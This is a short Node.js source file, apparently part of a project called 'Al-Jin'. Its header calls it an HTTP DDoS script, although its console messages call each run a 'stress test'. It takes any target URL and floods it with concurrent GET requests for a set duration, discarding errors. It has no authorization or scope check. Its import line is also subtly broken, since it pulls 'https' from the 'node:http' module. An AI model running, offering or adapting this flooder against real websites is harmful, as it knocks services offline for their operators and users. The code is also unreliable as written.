// Al-Jin · lib/ddos.js
// Standalone HTTP DDoS process script
import { http, https } from 'node:http';
import { URL } from 'node:url';

const args = process.argv.slice(2);
const targetUrl = args[0];
const durationSec = parseInt(args[1], 10) || 10;

if (!targetUrl) {
    console.error('Target URL missing.');
    process.exit(1);
}

let parsed;
try {
    parsed = new URL(targetUrl);
} catch (e) {
    console.error('Invalid URL:', targetUrl);
    process.exit(1);
}

const client = parsed.protocol === 'https:' ? https : http;
const endTime = Date.now() + durationSec * 1000;

console.log(`Starting stress test on ${targetUrl} for ${durationSec} seconds...`);

function sendReq() {
    if (Date.now() >= endTime) return;
    const req = client.get(targetUrl, () => {});
    req.on('error', () => {});
    req.end();
    setImmediate(sendReq);
}

// Spawn concurrency
for (let i = 0; i < 20; i++) {
    sendReq();
}

setTimeout(() => {
    console.log('Stress test completed.');
    process.exit(0);
}, durationSec * 1000);
